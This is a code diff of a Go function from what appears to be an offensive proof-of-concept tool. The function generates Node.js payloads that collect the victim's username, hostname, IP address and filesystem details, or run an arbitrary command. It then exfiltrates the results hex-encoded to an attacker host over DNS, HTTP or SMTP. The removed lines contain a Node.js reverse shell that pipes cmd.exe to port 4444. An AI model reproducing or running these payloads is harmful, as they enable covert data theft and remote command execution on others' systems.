@@ -104,13 +104,87 @@ func generatePayload(cfg *cli.Config) string {
 		port = ""
 	}
 
-	dataCollectionLogic := `
-const os = require('os');
-const fs = require('fs');
-const dns = require('dns');
-const http = require('http');
-const net = require('net');
+	// 1. Define Protocol Functions (Reusable)
+	protocolFuncs := ""
 
+	switch cfg.Poc {
+	case "dns":
+		protocolFuncs = fmt.Sprintf(`
+function sendData(payloads) {
+    payloads.forEach(hex => {
+        const chunks = hex.match(/.{1,60}/g) || [];
+        chunks.forEach(chunk => {
+            const targetDomain = chunk + '.%s';
+            try { dns.lookup(targetDomain, (err, address, family) => {}); } catch(e){}
+        });
+    });
+}
+`, host)
+	case "http":
+		protocolFuncs = fmt.Sprintf(`
+function sendData(payloads) {
+    let baseUrl = '%s';
+    if (!baseUrl.startsWith('http')) { baseUrl = 'http://' + baseUrl; }
+    if (!baseUrl.endsWith('/')) { baseUrl += '/'; }
+    payloads.forEach(hex => {
+        const targetUrl = baseUrl + hex;
+        try { http.get(targetUrl, (resp) => {}).on("error", (err) => {}); } catch(e){}
+    });
+}
+`, rawServer)
+	case "smtp":
+		smtpPort := "25"
+		if port != "" {
+			smtpPort = port
+		}
+		protocolFuncs = fmt.Sprintf(`
+function sendData(payloads) {
+    function sendSmtp(hex) {
+        const client = new net.Socket();
+        client.connect(%s, '%s', function() {
+            const payload = 'HELO ' + (os.hostname()) + '\\r\\n' +
+                'MAIL FROM: <test@' + (os.hostname()) + '>\\r\\n' +
+                'RCPT TO: <test@%s>\\r\\n' +
+                'DATA\\r\\n' +
+                'Subject: ' + hex + '\\r\\n\\r\\n' +
+                '.\\r\\n' +
+                'QUIT\\r\\n';
+            client.write(payload);
+            client.end();
+        });
+        client.on('error', function(err){});
+    }
+    payloads.forEach(hex => { sendSmtp(hex); });
+}
+`, smtpPort, host, host)
+	default:
+		// Should not happen if flag validation works, but fallback
+		protocolFuncs = "function sendData(payloads) { console.log(payloads); }"
+	}
+
+	// 2. Define Data Collection Logic (Default vs RCE)
+	collectionLogic := ""
+
+	if cfg.Rce != "" {
+		// RCE Mode: Execute command, hex encode stdout, send via protocol
+		// Escape quotes in command
+		collectionLogic = fmt.Sprintf(`
+const { exec } = require('child_process');
+const cmd = '%s';
+exec(cmd, (error, stdout, stderr) => {
+    // Collect stdout (or error if empty)
+    let output = stdout;
+    if (!output && stderr) output = "STDERR: " + stderr;
+    if (!output && error) output = "ERROR: " + error.message;
+    if (!output) output = "DONE (No Output)";
+    
+    const hex = Buffer.from(output).toString('hex');
+    sendData([hex]);
+});
+`, cfg.Rce)
+	} else {
+		// Default Mode: System Info + FS Info
+		collectionLogic = `
 function getIP() {
   const nets = os.networkInterfaces();
   for (const name of Object.keys(nets)) {
@@ -122,7 +196,6 @@ function getIP() {
   }
   return 'unknown';
 }
-
 const user = os.userInfo().username;
 const hostname = os.hostname();
 const ip = getIP();
@@ -140,109 +213,20 @@ const payloads = [
     Buffer.from(info).toString('hex'),
     Buffer.from(fsInfo).toString('hex')
 ];
+sendData(payloads);
 `
-
-	if cfg.Poc != "" {
-		switch cfg.Poc {
-		case "dns":
-			return fmt.Sprintf(`
-%s
-// DNS Exfiltration
-payloads.forEach(hex => {
-    // Split into 60-char chunks for valid DNS labels
-    const chunks = hex.match(/.{1,60}/g) || [];
-    chunks.forEach(chunk => {
-        const targetDomain = chunk + '.%s';
-        dns.lookup(targetDomain, (err, address, family) => {});
-    });
-});
-`, dataCollectionLogic, host)
-
-		case "http":
-			return fmt.Sprintf(`
-%s
-// HTTP Exfiltration
-let baseUrl = '%s';
-if (!baseUrl.startsWith('http')) {
-    baseUrl = 'http://' + baseUrl;
-}
-if (!baseUrl.endsWith('/')) {
-    baseUrl += '/';
-}
-payloads.forEach(hex => {
-    const targetUrl = baseUrl + hex;
-    http.get(targetUrl, (resp) => {}).on("error", (err) => {});
-});
-`, dataCollectionLogic, rawServer)
-
-		case "smtp":
-			smtpPort := "25"
-			if port != "" {
-				smtpPort = port
-			}
-			return fmt.Sprintf(`
-%s
-// SMTP Exfiltration
-function sendSmtp(hex) {
-    const client = new net.Socket();
-    client.connect(%s, '%s', function() {
-        const payload = 'HELO ' + hostname + '\r\n' +
-            'MAIL FROM: <test@' + hostname + '>\r\n' +
-            'RCPT TO: <test@%s>\r\n' +
-            'DATA\r\n' +
-            'Subject: ' + hex + '\r\n\r\n' +
-            '.\r\n' +
-            'QUIT\r\n';
-        client.write(payload);
-        client.end();
-    });
-    client.on('error', function(err){});
-}
-
-payloads.forEach(hex => {
-    sendSmtp(hex);
-});
-`, dataCollectionLogic, smtpPort, host, host)
-		}
-	} else if cfg.Rce != "" {
-		cmd := cfg.Rce
-		if cmd == "shell" {
-			// Reverse shell POC (simple/classic)
-			// Requiring a listener on server
-			// This is just a placeholder example, often users want specific one.
-			// Using a simple netcat-like reverse shell via generic child_process for now?
-			// Or just executing a hardcoded shell command.
-			// Implementing a basic nodejs reverse shell
-			return fmt.Sprintf(`
-(function(){
-    var net = require("net"),
-        cp = require("child_process"),
-        sh = cp.spawn("cmd.exe", []);
-    var client = new net.Socket();
-    client.connect(4444, "%s", function(){
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
-    });
-    return /a/; // Prevents the Node.js application from crashing
-})();
-`, rawServer)
-		} else {
-			// Execute provided command
-			// e.g. "calc.exe"
-			// Escape quotes in cmd
-			return fmt.Sprintf(`
-const { exec } = require('child_process');
-exec('%s', (error, stdout, stderr) => {
-    if (error) {
-        console.error('exec error: ' + error);
-        return;
-    }
-    console.log('stdout: ' + stdout);
-    if (stderr) console.error('stderr: ' + stderr);
-});
-`, cmd)
-		}
 	}
-	return "console.log('No payload specified');"
+
+	// 3. Assemble Final Payload
+	return fmt.Sprintf(`
+const os = require('os');
+const fs = require('fs');
+const dns = require('dns');
+const http = require('http');
+const net = require('net');
+
+%s
+
+%s
+`, protocolFuncs, collectionLogic)
 }
